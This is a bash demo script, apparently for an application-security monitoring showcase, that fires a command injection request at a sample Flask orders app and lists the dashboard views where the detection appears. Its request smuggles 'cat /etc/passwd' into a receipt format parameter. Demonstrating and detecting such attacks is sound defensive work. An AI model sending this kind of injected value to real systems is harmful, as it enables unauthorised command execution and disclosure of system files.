#!/usr/bin/env bash
# Demo: Command Injection via receipt format parameter
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/_common.sh"

banner "Command Injection (Receipt)" \
       "corndog-orders (Python/Flask)" \
       "ASM Threat Detection"

run_curl "Injecting shell command via format parameter" \
  "${BASE_URL}/api/orders/1/receipt?format=txt;cat+/etc/passwd"

dd_signal \
  "Security > Application Security > Signals — command injection threat event" \
  "APM > Traces — trace with attack payload in security trace"
